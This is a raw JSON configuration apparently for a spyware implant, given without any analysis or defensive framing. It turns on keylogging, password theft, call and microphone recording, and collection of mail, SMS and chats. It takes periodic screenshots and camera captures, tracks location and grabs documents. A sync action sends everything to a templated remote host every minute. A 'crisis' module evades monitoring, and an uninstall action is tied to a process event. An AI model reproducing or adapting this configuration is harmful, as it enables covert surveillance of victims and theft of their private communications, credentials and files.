{
    "globals": {
        "wipe": false,
        "type": "desktop",
        "advanced": true,
        "remove_driver": true,
        "migrated": false,
        "quota": {"min": 1048576, "max": 4194304000},
        "nohide": [],
        "collapsed": false,
        "version": 2012041601
    },
    "actions": [
        {
            "subactions": [
                {"status": "start", "module": "device", "action": "module"},
                {"status": "start", "module": "call", "action": "module"},
                {"status": "start", "module": "calendar", "action": "module"},
                {"status": "start", "module": "addressbook", "action": "module"},
                {"status": "start", "module": "messages", "action": "module"},
                {"status": "start", "module": "chat", "action": "module"},
                {"status": "start", "module": "url", "action": "module"},
                {"status": "start", "module": "keylog", "action": "module"},
                {"status": "start", "module": "mouse", "action": "module"},
                {"status": "start", "module": "password", "action": "module"},
                {"status": "start", "module": "file", "action": "module"}
            ],
            "desc": "STARTUP"
        },
        {
            "subactions": [{"status": "start", "module": "screenshot", "action": "module"}],
            "desc": "SCREENSHOT"
        },
        {"subactions": [{"status": "start", "module": "camera", "action": "module"}], "desc": "CAMERA"},
        {"subactions": [{"status": "start", "module": "position", "action": "module"}], "desc": "POSITION"},
        {
            "subactions": [
                {
                    "maxdelay": 0,
                    "host": "$(HOSTNAME)",
                    "stop": false,
                    "action": "synchronize",
                    "bandwidth": 500000,
                    "cell": false,
                    "mindelay": 0,
                    "wifi": true
                }
            ],
            "desc": "SYNC"
        },
        {"subactions": [{"action": "uninstall"}], "desc": ""}
    ],
    "events": [
        {
            "event": "timer",
            "desc": "STARTUP",
            "enabled": true,
            "start": 0,
            "subtype": "loop",
            "te": "23:59:59",
            "ts": "00:00:00"
        },
        {
            "event": "timer",
            "desc": "SCREENSHOT",
            "enabled": true,
            "repeat": 1,
            "start": 1,
            "te": "23:59:59",
            "subtype": "loop",
            "delay": 120,
            "ts": "00:00:00"
        },
        {
            "event": "timer",
            "desc": "CAMERA",
            "enabled": true,
            "repeat": 2,
            "start": 2,
            "te": "23:59:59",
            "subtype": "loop",
            "delay": 120,
            "iter": 1,
            "ts": "00:00:00"
        },
        {
            "event": "timer",
            "desc": "POSITION",
            "enabled": true,
            "repeat": 3,
            "start": 3,
            "te": "23:59:59",
            "subtype": "loop",
            "delay": 900,
            "ts": "00:00:00"
        },
        {
            "event": "timer",
            "desc": "SYNC",
            "enabled": true,
            "repeat": 4,
            "start": 4,
            "te": "23:59:59",
            "subtype": "loop",
            "delay": 60,
            "ts": "00:00:00"
        },
        {
            "event": "process",
            "desc": "",
            "enabled": true,
            "focus": false,
            "start": 5,
            "window": false,
            "process": "*calc*"
        }
    ],
    "modules": [
        {"module": "addressbook"},
        {"module": "application"},
        {"module": "calendar"},
        {"module": "call", "record": true, "compression": 5, "buffer": 512000},
        {"module": "camera", "quality": "med"},
        {"module": "chat"},
        {"module": "clipboard"},
        {
            "mic": true,
            "module": "crisis",
            "hook": {"processes": [], "enabled": true},
            "position": true,
            "camera": true,
            "call": true,
            "network": {"processes": [], "enabled": false},
            "synchronize": false
        },
        {"list": false, "module": "device"},
        {
            "open": false,
            "module": "file",
            "maxsize": 500000,
            "minsize": 1,
            "deny": [
                "*\\AppData\\Local*",
                "*\\AppData\\Roaming*",
                "*\\Skype\\Plugins\\*",
                "*\\$RECYCLE.BIN\\*",
                "*:\\Windows\\*",
                "*.dll",
                "*.exe",
                "*.ini",
                "*.lnk",
                "*.ico",
                "*.tlb",
                "*.clb",
                "*.dat",
                "*.drv",
                "*.ocx",
                "*.url",
                "\\\\.\\*"
            ],
            "capture": true,
            "date": "2013-03-04 00:00:00",
            "accept": [
                "*.doc",
                "*.docx",
                "*.xls",
                "*.xlsx",
                "*.ppt",
                "*.pptx",
                "*.pps",
                "*.ppsx",
                "*.odt",
                "*.ods",
                "*.odp",
                "*.rtf",
                "*.txt",
                "*.pdf"
            ]
        },
        {"module": "infection", "factory": "", "usb": false, "vm": 0, "mobile": false, "local": false},
        {"module": "keylog"},
        {
            "mail": {
                "filter": {
                    "datefrom": "2013-03-04 00:00:00",
                    "history": true,
                    "maxsize": 100000,
                    "dateto": "2100-01-01 00:00:00"
                },
                "enabled": true
            },
            "module": "messages",
            "sms": {
                "filter": {"datefrom": "2013-03-04 00:00:00", "history": true, "dateto": "2100-01-01 00:00:00"},
                "enabled": true
            },
            "mms": {
                "filter": {"datefrom": "2013-03-04 00:00:00", "history": true, "dateto": "2100-01-01 00:00:00"},
                "enabled": true
            }
        },
        {"threshold": 0.22, "silence": 5, "module": "mic", "autosense": false},
        {"height": 50, "module": "mouse", "width": 50},
        {"module": "password"},
        {"module": "position", "cell": true, "gps": false, "wifi": true},
        {"module": "screenshot", "onlywindow": false, "quality": "med"},
        {"module": "url"}
    ]
}